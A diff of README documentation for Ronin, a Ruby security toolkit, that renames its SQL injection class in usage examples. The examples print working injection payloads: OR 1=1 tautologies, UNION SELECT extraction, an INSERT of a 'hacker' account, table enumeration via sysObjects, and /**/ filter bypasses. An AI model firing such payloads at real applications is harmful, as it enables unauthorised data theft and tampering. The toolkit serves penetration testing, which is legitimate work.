@@ -61,7 +61,7 @@ string.sql_decode
 Injecting a `1=1` test into a Integer comparison:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.or { 1 == 1 }
 puts sqli
 # 1 OR 1=1
@@ -70,7 +70,7 @@ puts sqli
 Injecting a `1=1` test into a String comparison:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new(escape: :string)
+sqli = Ronin::Code::SQLI.new(escape: :string)
 sqli.or { string(1) == string(1) }
 puts sqli
 # 1' OR '1'='1
@@ -79,7 +79,7 @@ puts sqli
 Columns:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.and { admin == 1 }
 puts sqli
 # 1 AND admin=1
@@ -88,7 +88,7 @@ puts sqli
 Clauses:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.or { 1 == 1 }.limit(0)
 puts sqli
 # 1 OR 1=1 LIMIT 0
@@ -97,7 +97,7 @@ puts sqli
 Statements:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.and { 1 == 0 }
 sqli.insert.into(:users).values('hacker','passw0rd','t')
 puts sqli
@@ -107,7 +107,7 @@ puts sqli
 Sub-Statements:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.union { select(1,2,3,4,id).from(users) }
 puts sqli
 # 1 UNION SELECT (1,2,3,4,id) FROM users
@@ -116,7 +116,7 @@ puts sqli
 Test if a table exists:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.and { select(count).from(:users) == 1 }
 puts sqli
 # 1 AND (SELECT COUNT(*) FROM users)=1
@@ -125,7 +125,7 @@ puts sqli
 Create errors by using non-existent tables:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new(escape: :string)
+sqli = Ronin::Code::SQLI.new(escape: :string)
 sqli.and { non_existent_table == '1' }
 puts sqli
 # 1' AND non_existent_table='1
@@ -134,7 +134,7 @@ puts sqli
 Dumping all values of a column:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new(escape: :string)
+sqli = Ronin::Code::SQLI.new(escape: :string)
 sqli.or { username.is_not(null) }.or { username == '' }
 puts sqli
 # 1' OR username IS NOT NULL OR username='
@@ -143,7 +143,7 @@ puts sqli
 Enumerate through database table names:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.and {
   ascii(
     lower(
@@ -160,7 +160,7 @@ puts sqli
 Find user supplied tables via the `sysObjects` table:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.union_all {
   select(1,2,3,4,5,6,name).from(sysObjects).where { xtype == 'U' }
 }
@@ -171,7 +171,7 @@ puts sqli.to_sql(terminate: true)
 Bypass filters using `/**/` instead of spaces:
 
 ```ruby
-sqli = Ronin::Code::SQL::Injection.new
+sqli = Ronin::Code::SQLI.new
 sqli.union { select(1,2,3,4,id).from(users) }
 puts sqli.to_sql(space: '/**/')
 # 1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users
